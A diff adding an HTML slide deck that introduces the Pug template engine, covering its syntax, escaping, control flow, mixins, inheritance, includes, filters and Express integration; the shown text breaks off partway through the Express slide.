@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Introduction to Pug</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/theme/black.min.css">
+  <style>
+:root {
+  --amber:  #f5a623;
+  --green:  #4ecb8d;
+  --purple: #a78bfa;
+  --blue:   #60a5fa;
+  --red:    #f87171;
+  --bg:     #0a0a0f;
+  --bg2:    #10101a;
+  --bg3:    #181824;
+  --border: #2a2a3a;
+  --text:   #e8e8f0;
+  --muted:  #8888a8;
+}
+
+.reveal-viewport { background: var(--bg); }
+.reveal .slides section { background: transparent; }
+
+.reveal { font-family: 'DM Sans', sans-serif; color: var(--text); }
+.reveal h1, .reveal h2, .reveal h3 { font-family: 'Playfair Display', serif; font-weight: 700; }
+.reveal h1 { font-size: 1.6em; color: var(--amber); line-height: 1.1; }
+.reveal h2 { font-size: 1.1em; color: var(--amber); margin-bottom: .2em; }
+.reveal h3 { font-size: .78em; color: var(--green); margin-bottom: .15em; }
+.reveal p  { font-size: .56em; line-height: 1.45; color: var(--text); }
+.reveal li { font-size: .54em; line-height: 1.45; margin-bottom: .1em; }
+.reveal code { font-family: 'JetBrains Mono', monospace; font-size: .72em; }
+.reveal pre  { box-shadow: none; background: var(--bg3); border: 1px solid var(--border);
+               border-radius: 6px; padding: .3em .5em; margin: .25em 0; }
+.reveal pre code { font-size: .52em; line-height: 1.35; background: transparent; color: #cdd6f4; }
+
+.slide-hdr {
+  display: flex; align-items: center; gap: .4em;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: .2em; margin-bottom: .3em;
+}
+.slide-hdr .tag {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: .42em; font-weight: 500;
+  color: var(--bg); background: var(--amber);
+  padding: .1em .4em; border-radius: 3px;
+  letter-spacing: .04em;
+}
+.slide-hdr h2 { margin: 0; font-size: .95em; }
+
+.cols   { display: grid; gap: .5em; }
+.cols-2 { grid-template-columns: 1fr 1fr; }
+.cols-3 { grid-template-columns: 1fr 1fr 1fr; }
+.cols-6040 { grid-template-columns: 6fr 4fr; }
+.cols-4060 { grid-template-columns: 4fr 6fr; }
+
+.card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 6px; padding: .35em .6em;
+}
+.card.amber { border-left: 3px solid var(--amber); }
+.card.green { border-left: 3px solid var(--green); }
+.card.purple{ border-left: 3px solid var(--purple); }
+.card.blue  { border-left: 3px solid var(--blue); }
+.card.red   { border-left: 3px solid var(--red); }
+.card h3 { font-size: .64em; margin: 0 0 .12em; }
+.card p  { font-size: .52em; margin: 0; color: #b8b8d0; }
+.card ul { margin: 0; padding-left: 1em; }
+.card li { font-size: .52em; color: #b8b8d0; margin-bottom: .02em; }
+
+.reveal table { width: 100%; border-collapse: collapse; font-size: .5em; }
+.reveal table th { background: var(--bg3); color: var(--amber); font-weight: 600;
+                   padding: .2em .4em; border: 1px solid var(--border); text-align: left; }
+.reveal table td { padding: .18em .4em; border: 1px solid var(--border); color: #ccc; }
+.reveal table tr:nth-child(even) td { background: #0e0e18; }
+
+.a  { color: var(--amber); font-weight: 600; }
+.g  { color: var(--green); font-weight: 600; }
+.p  { color: var(--purple); font-weight: 600; }
+.b  { color: var(--blue); font-weight: 600; }
+.r  { color: var(--red); font-weight: 600; }
+.mono { font-family: 'JetBrains Mono', monospace; }
+
+svg.diagram { display: block; margin: 0 auto; overflow: visible; }
+
+.pill {
+  display: inline-block; font-family: 'JetBrains Mono', monospace;
+  font-size: .44em; padding: .08em .4em; border-radius: 99px;
+  border: 1px solid; margin: 0 .08em;
+}
+.pill.amber { color: var(--amber); border-color: var(--amber); }
+.pill.green { color: var(--green); border-color: var(--green); }
+.pill.purple{ color: var(--purple); border-color: var(--purple); }
+.pill.blue  { color: var(--blue); border-color: var(--blue); }
+
+.reveal .slide-footer { display: none; }
+.title-slide h1 { font-size: 1.8em; }
+.title-slide .subtitle {
+  font-size: .7em; color: var(--green); font-family: 'DM Sans', sans-serif;
+  font-weight: 300; letter-spacing: .04em; margin: .3em 0 .6em;
+}
+.title-slide .meta { font-size: .48em; color: var(--muted); font-family: 'JetBrains Mono', monospace; }
+
+.reveal ul, .reveal ol { margin: .15em 0 .15em 1em; }
+.reveal .slides > section { display: flex !important; flex-direction: column !important; overflow-y: auto !important; align-items: stretch !important; justify-content: flex-start !important; }
+  </style>
+</head>
+<body>
+  <div class="reveal"><div class="slides">
+
+<!-- ============================================================ -->
+<!-- SLIDE 01 — TITLE -->
+<!-- ============================================================ -->
+<section class="title-slide" data-background-color="#0a0a0f">
+  <div style="text-align:left; max-width:820px; margin:0 auto; padding: 1em 0;">
+    <div style="font-family:'JetBrains Mono',monospace; font-size:.5em; color:var(--muted); margin-bottom:.4em; letter-spacing:.1em;">NODE.JS TEMPLATE ENGINES</div>
+    <h1>Introduction to Pug</h1>
+    <div class="subtitle">Indentation-Based Templates &mdash; Clean Markup Without the Angle Brackets</div>
+    <div style="width:60px; height:3px; background:var(--amber); margin-bottom:1.4em;"></div>
+    <div class="meta">19 slides &middot; syntax, inheritance, mixins, filters, security, performance &middot; 2026</div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 02 — AGENDA -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">01</span><h2>Agenda</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>Foundations</h3>
+      <ul>
+        <li>What Is Pug?</li>
+        <li>Basic Syntax &mdash; Tags, Text, Attributes</li>
+        <li>Classes, IDs, and Inline Styles</li>
+        <li>Interpolation &amp; Escaping</li>
+        <li>Control Flow &mdash; Conditionals</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Composition</h3>
+      <ul>
+        <li>Control Flow &mdash; Iteration</li>
+        <li>Mixins</li>
+        <li>Template Inheritance</li>
+        <li>Includes</li>
+        <li>Filters</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Express &amp; Data</h3>
+      <ul>
+        <li>Express Integration</li>
+        <li>Passing Data to Templates</li>
+        <li>Security &mdash; XSS Prevention</li>
+        <li>Performance &amp; Caching</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Production</h3>
+      <ul>
+        <li>Pug vs Other Engines</li>
+        <li>Real-World Project Structure</li>
+        <li>Summary &amp; Next Steps</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 03 — WHAT IS PUG? -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">02</span><h2>What Is Pug?</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>History: From Jade to Pug</h3>
+        <p>Pug was originally called <span class="a">Jade</span>, created by <span class="g">TJ Holowaychuk</span> in 2010. Renamed to <span class="a">Pug</span> in 2016 due to a trademark conflict. The philosophy: write <span class="b">less markup</span>, produce clean HTML through <span class="b">indentation-based syntax</span> &mdash; no closing tags, no angle brackets.</p>
+      </div>
+      <div class="card green">
+        <h3>Key Characteristics</h3>
+        <ul>
+          <li><span class="a">Whitespace-significant</span> &mdash; indentation defines nesting</li>
+          <li><span class="a">No closing tags</span> &mdash; cleaner, more readable templates</li>
+          <li><span class="a">Built-in inheritance</span> &mdash; extends &amp; block without plugins</li>
+          <li><span class="a">Mixins</span> &mdash; reusable parameterised components</li>
+          <li><span class="a">~1.5M weekly npm downloads</span> &mdash; established ecosystem</li>
+          <li><span class="a">Full JS expressions</span> &mdash; any valid JS works inline</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Install &amp; Basic Use</h3>
+        <pre><code class="language-bash">npm install pug</code></pre>
+        <pre><code class="language-javascript">const pug = require('pug');
+
+// Compile a template string
+const fn = pug.compile('h1= title');
+const html = fn({ title: 'Hello Pug' });
+// &lt;h1&gt;Hello Pug&lt;/h1&gt;
+
+// Render a file directly
+const html2 = pug.renderFile(
+  './views/index.pug',
+  { users: [...] }
+);</code></pre>
+      </div>
+      <div class="card purple">
+        <h3>File Extension</h3>
+        <p>Convention: <code>.pug</code> files (previously <code>.jade</code>). If upgrading from Jade, rename files and update <code>require('jade')</code> to <code>require('pug')</code>.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 04 — BASIC SYNTAX: TAGS, TEXT, ATTRIBUTES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">03</span><h2>Basic Syntax &mdash; Tags, Text, Attributes</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Tags &amp; Nesting</h3>
+        <pre><code class="language-pug">//- Pug
+div
+  h1 Welcome
+  p This is a paragraph.
+  ul
+    li Item one
+    li Item two</code></pre>
+        <pre><code class="language-html">&lt;!-- HTML Output --&gt;
+&lt;div&gt;
+  &lt;h1&gt;Welcome&lt;/h1&gt;
+  &lt;p&gt;This is a paragraph.&lt;/p&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Item one&lt;/li&gt;
+    &lt;li&gt;Item two&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/div&gt;</code></pre>
+      </div>
+      <div class="card green">
+        <h3>Inline &amp; Block Text</h3>
+        <pre><code class="language-pug">//- Inline text after tag
+p Hello world
+
+//- Multi-line with pipe |
+p
+  | This is line one.
+  | This is line two.
+
+//- Block text with dot .
+script.
+  console.log('hello');
+  alert('world');</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Attributes</h3>
+        <pre><code class="language-pug">//- Parenthesised attributes
+a(href="/about", target="_blank") About
+
+//- Boolean attributes
+input(type="checkbox", checked)
+input(type="text", disabled)
+
+//- Multi-line attributes
+input(
+  type="text"
+  name="email"
+  placeholder="you@example.com"
+  required
+)</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Self-Closing Tags</h3>
+        <pre><code class="language-pug">//- Void elements auto-close
+img(src="/logo.png", alt="Logo")
+br
+hr
+input(type="hidden", name="_csrf")</code></pre>
+        <p>Pug knows which HTML elements are void and self-closes them automatically &mdash; no trailing <code>/</code> needed.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 05 — CLASSES, IDS, AND INLINE STYLES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">04</span><h2>Classes, IDs, and Inline Styles</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>CSS-Selector Shorthand</h3>
+        <pre><code class="language-pug">//- Classes with .
+div.container
+  p.lead.text-center Hello
+
+//- IDs with #
+div#app
+  h1#title My App
+
+//- Combined
+div#main.wrapper.dark
+
+//- Implicit div (omit tag name)
+.container
+  #sidebar
+    p Content</code></pre>
+        <pre><code class="language-html">&lt;!-- HTML Output --&gt;
+&lt;div class="container"&gt;
+  &lt;div id="sidebar"&gt;
+    &lt;p&gt;Content&lt;/p&gt;
+  &lt;/div&gt;
+&lt;/div&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Dynamic Classes &amp; IDs</h3>
+        <pre><code class="language-pug">//- Expression in attribute
+div(class=isActive ? 'on' : 'off')
+
+//- Array of classes
+div(class=['btn', 'btn-' + size])
+
+//- Object syntax (truthy = included)
+div(class={active: isActive, hidden: !show})
+
+//- Mix shorthand + dynamic
+a.nav-link(class={active: current})</code></pre>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Inline Styles</h3>
+        <pre><code class="language-pug">//- String style
+div(style="color: red; font-size: 14px;")
+
+//- Object style
+div(style={color: 'red', fontSize: '14px'})</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>The &amp;attributes Syntax</h3>
+        <pre><code class="language-pug">//- Spread attributes from an object
+- var attrs = {id: 'box', class: 'wide'}
+div&amp;attributes(attrs) Hello</code></pre>
+        <p>Useful for passing dynamic attribute sets into mixins or components.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 06 — INTERPOLATION & ESCAPING -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">05</span><h2>Interpolation &amp; Escaping</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3><code>#{}</code> &mdash; Escaped (Safe)</h3>
+        <pre><code class="language-pug">//- Escaped interpolation (default)
+p Welcome, #{user.name}!
+p You have #{count} messages.
+
+//- Equivalent buffered output
+p= 'Welcome, ' + user.name + '!'</code></pre>
+        <pre><code class="language-html">&lt;!-- If user.name = '&lt;b&gt;Jo&lt;/b&gt;' --&gt;
+&lt;p&gt;Welcome, &amp;lt;b&amp;gt;Jo&amp;lt;/b&amp;gt;!&lt;/p&gt;</code></pre>
+        <p>Characters escaped: <code>&amp;</code> <code>&lt;</code> <code>&gt;</code> <code>"</code> <code>'</code></p>
+      </div>
+      <div class="card amber">
+        <h3>Buffered vs Unbuffered Code</h3>
+        <pre><code class="language-pug">//- Buffered (outputs escaped)
+p= user.name
+
+//- Unbuffered (no output, runs JS)
+- var x = 10
+- var items = ['a', 'b', 'c']
+
+//- Unescaped buffered
+p!= richContent</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card red" style="margin-bottom:.4em;">
+        <h3><code>!{}</code> &mdash; Unescaped (Dangerous)</h3>
+        <pre><code class="language-pug">//- Unescaped interpolation
+div !{htmlContent}
+
+//- Unescaped buffered output
+div!= htmlContent</code></pre>
+        <pre><code class="language-html">&lt;!-- If htmlContent = '&lt;b&gt;Bold&lt;/b&gt;' --&gt;
+&lt;div&gt;&lt;b&gt;Bold&lt;/b&gt;&lt;/div&gt;</code></pre>
+        <p>HTML renders as-is. <span class="r">Dangerous with user input!</span></p>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Attribute Interpolation</h3>
+        <pre><code class="language-pug">//- JS expressions in attributes
+a(href='/users/' + user.id)= user.name
+
+//- ES6 template literals
+a(href=`/users/${user.id}`) Profile
+
+//- Escaped by default in attributes
+input(value=userInput)</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>When To Use Unescaped</h3>
+        <ul>
+          <li>Pre-sanitised CMS / Markdown HTML</li>
+          <li>Trusted SVG or icon markup</li>
+          <li><span class="r">Never</span> with raw user input</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 07 — CONTROL FLOW: CONDITIONALS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">06</span><h2>Control Flow &mdash; Conditionals</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>if / else if / else</h3>
+        <pre><code class="language-pug">if user.role === 'admin'
+  .badge.admin Admin
+else if user.role === 'editor'
+  .badge.editor Editor
+else
+  .badge.member Member</code></pre>
+        <pre><code class="language-html">&lt;!-- No braces, no parentheses --&gt;
+&lt;!-- Indentation defines scope --&gt;</code></pre>
+      </div>
+      <div class="card green">
+        <h3>unless (Negated if)</h3>
+        <pre><code class="language-pug">//- unless = if NOT
+unless user.isVerified
+  .alert Please verify your email.
+
+//- Equivalent to:
+if !user.isVerified
+  .alert Please verify your email.</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>case / when (Switch)</h3>
+        <pre><code class="language-pug">case user.role
+  when 'admin'
+    p Full access granted
+  when 'editor'
+    p Edit access granted
+  when 'viewer'
+    p Read-only access
+  default
+    p No special permissions</code></pre>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Inline Conditionals</h3>
+        <pre><code class="language-pug">//- Ternary in attributes
+a(class=active ? 'on' : 'off') Link
+
+//- Conditional attributes
+input(type="text", disabled=isLocked)
+//- If isLocked is false, attribute
+//- is omitted entirely
+
+//- Ternary in interpolation
+p Status: #{active ? 'Active' : 'Inactive'}</code></pre>
+      </div>
+      <div class="card red">
+        <h3>Tip: Keep Logic Thin</h3>
+        <p>Move complex conditions into helper functions or compute them in the route handler. Templates should branch, not compute.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 08 — CONTROL FLOW: ITERATION -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">07</span><h2>Control Flow &mdash; Iteration</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>each (Most Common)</h3>
+        <pre><code class="language-pug">ul
+  each user in users
+    li #{user.name} &mdash; #{user.email}
+
+//- With index
+ul
+  each item, i in items
+    li #{i + 1}. #{item.name}</code></pre>
+      </div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>each ... else (Empty State)</h3>
+        <pre><code class="language-pug">each product in products
+  .product
+    h3= product.name
+    p= product.price
+else
+  p.empty No products found.</code></pre>
+        <p>The <code>else</code> block runs when the array is empty. No separate <code>if</code> check needed.</p>
+      </div>
+      <div class="card purple">
+        <h3>Iterating Objects</h3>
+        <pre><code class="language-pug">//- each val, key in object
+each val, key in settings
+  p #{key}: #{val}
+
+//- Output:
+//- &lt;p&gt;theme: dark&lt;/p&gt;
+//- &lt;p&gt;lang: en&lt;/p&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>while Loop</h3>
+        <pre><code class="language-pug">- var n = 0
+ul
+  while n &lt; 5
+    li= n++
+
+//- Useful for non-array iteration
+//- or generating sequences</code></pre>
+      </div>
+      <div class="card red" style="margin-bottom:.4em;">
+        <h3>each vs for</h3>
+        <pre><code class="language-pug">//- 'each' is Pug-native sugar
+each item in items
+  p= item
+
+//- 'for' is an alias for 'each'
+for item in items
+  p= item
+
+//- Both compile to the same output</code></pre>
+        <p><code>each</code> and <code>for</code> are interchangeable in Pug. Convention favours <code>each</code>.</p>
+      </div>
+      <div class="card amber">
+        <h3>Nested Iteration</h3>
+        <pre><code class="language-pug">each category in categories
+  h2= category.name
+  ul
+    each item in category.items
+      li= item.title</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 09 — MIXINS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">08</span><h2>Mixins</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Defining &amp; Calling</h3>
+        <pre><code class="language-pug">//- Define a mixin
+mixin card(title, text)
+  .card
+    h3= title
+    p= text
+
+//- Call the mixin
++card('Hello', 'World')
++card('Pug', 'Template engine')</code></pre>
+        <pre><code class="language-html">&lt;!-- HTML Output --&gt;
+&lt;div class="card"&gt;
+  &lt;h3&gt;Hello&lt;/h3&gt;
+  &lt;p&gt;World&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="card"&gt;
+  &lt;h3&gt;Pug&lt;/h3&gt;
+  &lt;p&gt;Template engine&lt;/p&gt;
+&lt;/div&gt;</code></pre>
+      </div>
+      <div class="card green">
+        <h3>Rest Arguments</h3>
+        <pre><code class="language-pug">mixin list(id, ...items)
+  ul(id=id)
+    each item in items
+      li= item
+
++list('fruits', 'Apple', 'Banana', 'Cherry')</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Passing Blocks</h3>
+        <pre><code class="language-pug">//- Mixin with block content
+mixin panel(title)
+  .panel
+    .panel-header= title
+    .panel-body
+      if block
+        block
+
+//- Usage: nested content as block
++panel('Settings')
+  p Adjust your preferences.
+  button Save Changes</code></pre>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Mixin Attributes</h3>
+        <pre><code class="language-pug">//- attributes object is implicit
+mixin btn(label)
+  button.btn&amp;attributes(attributes)= label
+
++btn('Submit')(type='submit', class='primary')
++btn('Cancel')(type='button', class='ghost')</code></pre>
+        <p>The <code>&amp;attributes</code> syntax spreads caller attributes onto the mixin&rsquo;s root element.</p>
+      </div>
+      <div class="card red">
+        <h3>Best Practices</h3>
+        <ul>
+          <li>Keep mixins <span class="a">small and focused</span></li>
+          <li>Store shared mixins in a separate file and <code>include</code> them</li>
+          <li>Use <code>block</code> for flexible content injection</li>
+          <li>Use <code>&amp;attributes</code> for pass-through HTML attributes</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 10 — TEMPLATE INHERITANCE -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">09</span><h2>Template Inheritance</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>extends &amp; block</h3>
+        <pre><code class="language-pug">//- views/layout.pug (base template)
+doctype html
+html(lang="en")
+  head
+    meta(charset="UTF-8")
+    title #{title} | My App
+    block styles
+      link(rel="stylesheet", href="/css/main.css")
+  body
+    include partials/nav
+    main.container
+      block content
+    include partials/footer
+    block scripts</code></pre>
+      </div>
+      <div class="card green">
+        <h3>Child Template</h3>
+        <pre><code class="language-pug">//- views/home.pug
+extends layout
+
+block content
+  h1 Welcome Home
+  p This replaces the content block.
+
+block scripts
+  script(src="/js/home.js")</code></pre>
+        <p>The child <span class="a">replaces</span> each named block. Unspecified blocks keep the parent&rsquo;s default content.</p>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>block append &amp; block prepend</h3>
+        <pre><code class="language-pug">//- Add to a block instead of replacing
+extends layout
+
+block append styles
+  link(rel="stylesheet", href="/css/about.css")
+
+block prepend scripts
+  script(src="/js/vendor/chart.js")
+
+block content
+  h1 About Us</code></pre>
+        <p><span class="a">append</span> adds after the parent block. <span class="a">prepend</span> adds before. Both preserve the parent&rsquo;s content.</p>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Multi-Level Inheritance</h3>
+        <pre><code class="language-pug">//- layout.pug &rarr; admin-layout.pug &rarr; dashboard.pug
+//- Each level can extend the previous
+//- and override or append to blocks</code></pre>
+      </div>
+      <div class="card red">
+        <h3>Inheritance vs Includes</h3>
+        <ul>
+          <li><span class="a">extends/block</span> &mdash; define a page skeleton, override sections</li>
+          <li><span class="a">include</span> &mdash; insert a reusable fragment (nav, footer)</li>
+          <li>Use both together: layout uses includes, pages extend the layout</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 11 — INCLUDES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">10</span><h2>Includes</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Basic Include Syntax</h3>
+        <pre><code class="language-pug">//- Include a Pug file (no extension needed)
+include partials/nav
+
+//- Include with a relative path
+include ./components/sidebar
+
+//- Include a plain-text file
+include:css styles/inline.css
+include plaintext.txt</code></pre>
+        <p>Pug includes are resolved relative to the <em>current</em> file. The included file is compiled as Pug by default.</p>
+      </div>
+      <div class="card green">
+        <h3>Reusable Partial Example</h3>
+        <pre><code class="language-pug">//- partials/card.pug
+.card
+  if image
+    img(src=image, alt=title)
+  h3= title
+  p.price $#{price.toFixed(2)}</code></pre>
+        <pre><code class="language-pug">//- In a page template
+each product in products
+  include partials/card</code></pre>
+        <p>Variables from the parent scope are accessible inside the include &mdash; no explicit passing needed.</p>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>Include with Filters</h3>
+        <pre><code class="language-pug">//- Include and process through a filter
+include:markdown-it docs/intro.md
+
+//- Include raw HTML
+include:html legacy/widget.html</code></pre>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Inheritance vs Includes</h3>
+        <table>
+          <thead><tr><th>Feature</th><th>extends/block</th><th>include</th></tr></thead>
+          <tbody>
+            <tr><td>Purpose</td><td>Page skeleton</td><td>Reusable fragment</td></tr>
+            <tr><td>Content flow</td><td>Child overrides parent</td><td>Fragment inserted in place</td></tr>
+            <tr><td>Data access</td><td>Shared scope</td><td>Shared scope</td></tr>
+            <tr><td>Typical use</td><td>Layouts</td><td>Nav, footer, widgets</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="card red">
+        <h3>Path Resolution</h3>
+        <p>Paths are relative to the <em>including</em> file. Use <code>basedir</code> option for absolute paths: <code>include /partials/nav</code> resolves from <code>basedir</code>.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 12 — FILTERS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">11</span><h2>Filters</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>What Are Filters?</h3>
+        <p>Filters let you embed <span class="a">other languages</span> inside Pug templates. The content is processed by an external module at compile time and the result is inserted into the HTML output.</p>
+        <pre><code class="language-pug">//- General syntax
+:filterName
+  Content processed by filterName</code></pre>
+      </div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>:markdown-it</h3>
+        <pre><code class="language-pug">//- Requires: npm install jstransformer-markdown-it
+:markdown-it
+  # Hello World
+  This is **bold** and _italic_.
+  - List item one
+  - List item two</code></pre>
+        <pre><code class="language-html">&lt;!-- Output --&gt;
+&lt;h1&gt;Hello World&lt;/h1&gt;
+&lt;p&gt;This is &lt;strong&gt;bold&lt;/strong&gt;
+and &lt;em&gt;italic&lt;/em&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;List item one&lt;/li&gt;
+  &lt;li&gt;List item two&lt;/li&gt;
+&lt;/ul&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>:babel (ES6+ in Browser)</h3>
+        <pre><code class="language-pug">//- Requires: npm install jstransformer-babel
+script
+  :babel
+    const greet = (name) =&gt; {
+      console.log(`Hello, ${name}!`);
+    };
+    greet('Pug');</code></pre>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Custom Filters</h3>
+        <pre><code class="language-javascript">// Register via options
+const pug = require('pug');
+const html = pug.renderFile('tpl.pug', {
+  filters: {
+    'upper': (text) =&gt; text.toUpperCase(),
+    'wrap-div': (text, opts) =&gt;
+      `&lt;div class="${opts.class}"&gt;${text}&lt;/div&gt;`
+  }
+});</code></pre>
+        <pre><code class="language-pug">//- Usage
+:upper
+  this becomes uppercase
+:wrap-div(class="box")
+  content inside a div</code></pre>
+      </div>
+      <div class="card red">
+        <h3>Available Filters</h3>
+        <p>Pug uses the <span class="a">jstransformer</span> ecosystem. Install <code>jstransformer-*</code> packages: <code>markdown-it</code>, <code>babel</code>, <code>scss</code>, <code>coffee-script</code>, <code>uglify-js</code>, and many more.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 13 — EXPRESS INTEGRATION -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">12</span><h2>Express Integration</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>Basic Setup</h3>
+        <pre><code class="language-javascript">const express = require('express');
+const path = require('path');
+const app = express();
+
+// Set Pug as the view engine
+app.set('view engine', 'pug');
+
+// Set the views directory
+app.set('views',
+  path.join(__dirname, 'views'));
+
+// Render a template
+app.get('/', (req, res) =&gt; {
+  res.render('index', {
+    title: 'Home'
+  });
+});</code></pre>
+        <p>Express calls <code>pug.__express</code> under the hood &mdash; no extra middleware needed.</p>
+      </div>
+      <div class="card green">
+        <h3>No Layout Plugin Needed</h3>
+        <pre><code class="language-pug">//- Unlike EJS, Pug has built-in
+//- extends/block — no plugin required
+//- views/index.pug
+extends layout
+
+block content
+  h1= title
+  p Welcome to the site.</code></pre>
+        <p>Pug&rsquo;s built-in template inheritance replaces the need for <code>express-ejs-layouts</code> or similar.</p>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>res.render() in Detail</h3>
+        <pre><code class="language-javascript">// Signature
+res.render(view, [locals], [callback]);
+
+// Examples
+res.render('dashboard');        // no data
+res.render('dashboard', {      // with data
+  title: 'Dashboard',
+  user: req.user
+});
+res.render('report', data, (err, html) =&gt; {
+  if (err) return next(err);
+  res.send(html);              // manual send
+});</code></pre>
+      </div>
+      <div class="card blue" style="margin-bottom:.4em;">
+        <h3>Pug Options via Express</h3>
+        <pre><code class="language-javascript">// Pretty-print HTML in development
+app.locals.pretty = true;
+
+// Set basedir for absolute includes
+app.locals.basedir = path.join(
+  __dirname, 'views'
+);
+
+// Enable caching in production
+app.set('view cache', true);</code></pre>
+      </div>
+      <div class="card red">
+        <h3>File Resolution</h3>
